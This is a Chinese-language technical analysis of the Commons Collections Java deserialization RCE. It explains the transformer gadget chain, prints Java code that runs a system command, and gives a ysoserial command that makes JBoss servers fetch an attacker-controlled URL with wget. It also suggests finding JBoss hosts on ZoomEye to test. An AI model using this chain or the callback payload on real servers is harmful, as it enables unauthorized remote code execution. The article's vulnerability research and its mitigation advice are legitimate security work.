# common-collections中Java反序列化漏洞导致的RCE原理分析

0x00 背景
=======

* * *

这几天在zone看到了有人提及了有关于common-collections包的RCE漏洞，并且`http://zone.wooyun.org/content/23849`给出了具体的原理。作为一个业余的安全研究人员，除了会利用之外，还可以探究一下背后的原理。

0x01 原理
=======

* * *

Java反序列化导致的漏洞原理上和PHP反序列一样，也是由于用户的输入可以控制我们传入的对象。如果服务端程序没有对用户可控的序列化代码进行校验而是直接进行反序列化使用，并且程序中运行一些比较危险的逻辑（如eval，登录验证等），就会触发一些意想不到的漏洞。实际上，这并不是什么新的问题了，有关于Java中的反序列化导致的漏洞可以看`https://speakerdeck.com/player/2630612322be4a2696a31775f2ed005d的slide`了解一下。

而这次，主要探讨一下在特殊环境下，反序列化能否达到远程代码执行（RCE）。

参考文章3中给出了exp，并且在zone上有了很多的讨论，配合github上的jar文件生成一个序列化字符串，然后发送给漏洞站点就能触发。关于利用，并不是本文的重点。

问题从`common-collections`工具的各个`transformer`说起，这些`transform`主要用于对Map的键值进行转化。

![](http://drops.javaweb.org/uploads/images/0259025ae56d3adfdfb6051cb6be50ff045476ce.jpg)

其中，国外研究人员发现类`InvokerTransformer`中的`transform`方法允许通过反射执行参数对象的某个方法，并返回执行结果。

![](http://drops.javaweb.org/uploads/images/a0d6d078b735524399332b0d506f47213b1ad9f4.jpg)

我们来写个代码测试一下：

```
@SuppressWarnings({"rawtypes", "unchecked"})
public class VulTest {
    public static void main(String[] args) {
        Transformer transform = new InvokerTransformer(
                "append",
                new Class[]{String.class},
                new Object[]{"exploitcat?"});
        Object newObject = transform.transform(new StringBuffer("your name is ")) ;
        System.out.println(newObject);    

    }
}

```

这里创建了一个`InvokerTransformer`对象，并且调用了它的`transform`，参数是个`StringBuilder`对象，执行后会输出一个字符串：

```
your name is exploitcat?

```

可以看到，通过`transform`方法里的反射，我们成功调用了`StringBuilder`中的`append`方法并返回结果，虽然过程有些曲折。这样，我们离RCE又近了一步，那么谁会去调用这些`transformer`对象的`transform`方法呢？

调用这些`transform`方法的是一个叫`TransformedMap`的类，这个类可以当做原生Map类的一个包装类（通过`TransformedMap.decorate`方法）。进入这个类一探究竟：

![](http://drops.javaweb.org/uploads/images/c82efc99f4fd086abe58ff77826cd68146bd50cb.jpg)

这里的`decorate`方法就是对外创建`TransformedMap`对象的方法。在代码中我们可以清晰找到`transform`方法是如何被调用的。

![](http://drops.javaweb.org/uploads/images/66f040754e6530296e5ed8a485fae9be412abecc.jpg)

以及`entry`对象调用`setValue`时，执行的`checkSetValue`：

![](http://drops.javaweb.org/uploads/images/4965eb1b238fe786a20915634bc9124fed0c6478.jpg)

为了搞清楚为啥在`setValue`的时候发生了什么，我们来看代码：

```
public class TransformTest {
    public static void main(String[] args) {
        Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class},
                    new Object[]{"getRuntime", new Class[0]}),
            new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class}, 
                    new Object[]{null, new Object[0]}),
            new InvokerTransformer("exec", new Class[]{String.class}, 
                    new Object[]{"calc"})
        };
        Transformer chain = new ChainedTransformer(transformers) ;
        Map innerMap = new HashMap() ;
        innerMap.put("name", "hello") ;
        Map outerMap = TransformedMap.decorate(innerMap, null, chain) ;

        Map.Entry elEntry = (Entry) outerMap.entrySet().iterator().next() ;
        elEntry.setValue("hello") ;
    }
}

```

代码中，我们将我们要执行的多行代码分散到各个`transformer`里，使用`InvokeTransformer`类来执行我们的方法。接着用`TransformedMap`来执行`transfom`方法触发代码。

这里的原生Map用来被`TransformedMap`包装，然后map的`entry`对象调用了`setValue`方法。在java环境中执行上面的代码，最后会弹出计算器：

![](http://drops.javaweb.org/uploads/images/5fb4d785448d93bb4d91e27a2ee37ec6a1280d89.jpg)

到目前为止，我们找了一些创造RCE的条件：

（1）使用了`InvokeTransformer`的对象，并在`transform`方法里执行代码；  
（2）使用`TransformedMap`通过执行setValue方法来触发`transform`方法。

对于一个“不讲道理”的RCE，显然需要另一个好用的类来同时满足上面两点，并且在`readObject`里进行调用。`readObject`方法是java的序列化对象（实现了`Serializable`接口）中首先会调用的方法。

0x02 利用
=======

* * *

这里配合我们执行代码的类就是`AnnotationInvocationHandler`，我们来看看`readObject`方法里面有什么逻辑：

![](http://drops.javaweb.org/uploads/images/482701d9cff3aa95d3d6e51515be8d7120b7143f.jpg)

可以看到，首先调用了`defaultReadObject`来获取了类属性`type`和`memberValues`，找到定义，这两个东西如下：

![](http://drops.javaweb.org/uploads/images/57e783452cb82c95d9b107782629cff248d790d6.jpg)

在`readObject`方法中，类型检查之前就触发了我们对象的方法。从`memberValues`参数中获取了`entry`并`setValue`，这样，虽然可能会有类型错误，但是代码却执行了。符合了之前我们关于RCE的构想。所以看懂exp就变得很简单。exp做了一件事情，就是返回一个序列化的`handler`对象，对象里包含了我们的`transformer`对象数组，用来装载我们要执行的代码。

创建`handler`的方法如下:

![](http://drops.javaweb.org/uploads/images/84a0ea50a20e22d50be5859539099362290f87a8.jpg)

利用反射，获取到`AnnotationInvocationHandler`的构造函数，并传入了我们的map，`getInstance`返回一个`handler`对象，完成了所要求的一切，之后，找个使用可控序列化的地方发送这个序列化`handler`即可执行我们的代码。

我还是把exp贴上来吧，这段代码就是构造我们的`handler`对象：

![](http://drops.javaweb.org/uploads/images/6f9bee578ef61c5540e4d06f27af38cfe51d9a73.jpg)

首先exp里构造了`transformer`对象数组并用`LazyMap`进行包装，包装后装到一个`handler`对象里并返回这个`handler`。

0x03 演示
=======

* * *

为什么说这个RCE影响大，具体可以看看参考文章1中作者给出的几个案例，可以看到主流的java-web中间件都受到了影响，包括jboss、WebLogic、 WebSphere等。

以jboss为例的利用教程，在zone里[http://zone.wooyun.org/content/23847](http://zone.wooyun.org/content/23847)已经给出步骤了，利用门槛不高，只需要在zoomeye上找jboss来测试即可。

由于是RCE，所以花样很多了，这里我就挑几个案例，利用CloudEye执行看看，执行命令为：

```
wget http://your-cloudeye-site

```

如果成功执行，那么我们的cloudeye上应该有日志的。 具体如下：

```
java -jar ysoserial-0.0.2-all.jar CommonsCollections1 'wget http://your-cloudeye-site' > out.ser

```

上面的命令是获取执行wget命令的`handler`对象的序列化code，然后我们访问jboss里的JMX服务：

![](http://drops.javaweb.org/uploads/images/593cde94eb88001b987a898c64e8702dfa858e5a.jpg)

在cloudeye上，成功获取了访问记录：

![](http://drops.javaweb.org/uploads/images/f32d142332833d57e0a1d570ea6e4b3e2cd5e242.jpg)

配合cloudeye，我们完全可以做到命令回显，不过既然是RCE了，玩儿法就太多了。

实际上，参考文章1中给出了JAVA中使用了序列化的场景：

> *   In HTTP requests – Parameters, ViewState, Cookies, you name it.
> *   RMI – The extensively used Java RMI protocol is 100% based on serialization
> *   RMI over HTTP – Many Java thick client web apps use this – again 100% serialized objects
> *   JMX – Again, relies on serialized objects being shot over the wire
> *   Custom Protocols – Sending an receiving raw Java objects is the norm – which we’ll see in some of the exploits to come

如果想探索这个漏洞的利用，那么我推荐你阅读以下这篇文章。

0x04 总结
=======

* * *

总结下，漏洞产生的主要问题还是在用户可控的序列化字符串上，在使用`ObjectInputStream`与`ObjectOutputStream`类的时候，最好进行白名单校验，防止意外的发生。 配合参考文章1，估计接下来乌云上又会刮起一阵腥风血雨。

参考文章：
=====

1.  [http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#jboss](http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#jboss)
2.  [https://blogs.apache.org/foundation/entry/apache_commons_statement_to_widespread](https://blogs.apache.org/foundation/entry/apache_commons_statement_to_widespread)
3.  [https://github.com/frohoff/ysoserial](https://github.com/frohoff/ysoserial)